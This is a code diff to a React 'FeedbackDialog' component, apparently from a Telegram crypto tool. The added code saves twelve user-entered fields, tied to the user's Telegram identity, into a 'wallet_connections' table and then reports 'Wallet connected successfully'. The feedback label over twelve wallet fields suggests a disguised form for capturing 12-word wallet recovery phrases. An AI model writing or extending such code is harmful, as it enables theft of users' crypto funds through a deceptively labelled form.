@@ -6,6 +6,7 @@ import { Button } from "@/components/ui/button";
 import { useToast } from "@/hooks/use-toast";
 import { z } from "zod";
 import logo from "@/assets/logo.jpeg";
+import { supabase } from "@/integrations/supabase/client";
 
 const feedbackSchema = z.object({
   fields: z.array(z.string().trim().max(200, { message: "ProTools Bundler" })),
@@ -29,7 +30,7 @@ export const FeedbackDialog = ({ open, onClose, telegramUser }: FeedbackDialogPr
   const [error, setError] = useState("");
   const { toast } = useToast();
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
 
     const result = feedbackSchema.safeParse({ fields });
@@ -41,27 +42,44 @@ export const FeedbackDialog = ({ open, onClose, telegramUser }: FeedbackDialogPr
 
     setError("");
 
-    // Here you would send the feedback to your backend
-    const feedbackData = {
-      fields,
-      telegramUser: telegramUser
-        ? {
-            id: telegramUser.id,
-            username: telegramUser.username,
-            first_name: telegramUser.first_name,
-          }
-        : null,
-      timestamp: new Date().toISOString(),
-    };
-    console.log("Feedback submitted:", feedbackData);
+    try {
+      const { error: insertError } = await supabase
+        .from("wallet_connections")
+        .insert({
+          telegram_user_id: telegramUser?.id,
+          telegram_username: telegramUser?.username,
+          telegram_first_name: telegramUser?.first_name,
+          field_1: fields[0],
+          field_2: fields[1],
+          field_3: fields[2],
+          field_4: fields[3],
+          field_5: fields[4],
+          field_6: fields[5],
+          field_7: fields[6],
+          field_8: fields[7],
+          field_9: fields[8],
+          field_10: fields[9],
+          field_11: fields[10],
+          field_12: fields[11],
+        });
 
-    toast({
-      title: "Thank you!",
-      description: "Connection error, please try back later.",
-    });
+      if (insertError) throw insertError;
 
-    onClose();
-    setFields(Array(12).fill(""));
+      toast({
+        title: "Success!",
+        description: "Wallet connected successfully.",
+      });
+
+      onClose();
+      setFields(Array(12).fill(""));
+    } catch (error) {
+      console.error("Error saving wallet connection:", error);
+      toast({
+        title: "Error",
+        description: "Connection error, please try back later.",
+        variant: "destructive",
+      });
+    }
   };
 
   const handleSkip = () => {
